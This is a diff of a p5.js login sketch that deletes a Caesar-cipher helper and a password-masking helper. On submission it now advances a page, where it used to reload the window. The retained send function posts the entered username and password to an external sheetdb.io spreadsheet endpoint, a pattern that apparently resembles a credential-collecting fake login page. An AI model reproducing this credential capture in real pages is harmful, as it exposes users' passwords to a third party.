@@ -30,40 +30,8 @@ function preload(){
 let username;
 let password;
 let trials = 0;
-function encrypt(text, shift) {
-  let result = '';
-  for (let i = 0; i < text.length; i++) {
-    let char = text.charCodeAt(i);
-    if (char >= 65 && char <= 90) {
-      // Uppercase letters
-      result += String.fromCharCode((char - 65 + shift) % 26 + 65);
-    } else if (char >= 97 && char <= 122) {
-      // Lowercase letters
-      result += String.fromCharCode((char - 97 + shift) % 26 + 97);
-    } else {
-      // Non-alphabetic characters
-      result += text.charAt(i);
-    }
-  }
-  return result;
-}
-function decrypt(text, shift) {
-  return encrypt(text, 26 - shift);
-}
-
 function windowResized(){
   resizeCanvas(windowWidth,windowHeight);
-}
-function replaceExcept(strs) {
-  let result = '';
-  for (let i = 0; i < strs.length; i++) {
-    if (str[i] === '') {
-      result += '';
-    } else {
-      result += '•';
-    }
-  }
-  return result;
 }
 function send(user,pass){
   fetch('https://sheetdb.io/api/v1/tbfbe5pdzqev3', {
@@ -127,7 +95,7 @@ function draw() {
     }
   }else if (page===2){
     send(username.value(),password.value());
-    window.location.reload();
+    page++;
   }
   
   if (mouseIsPressed){
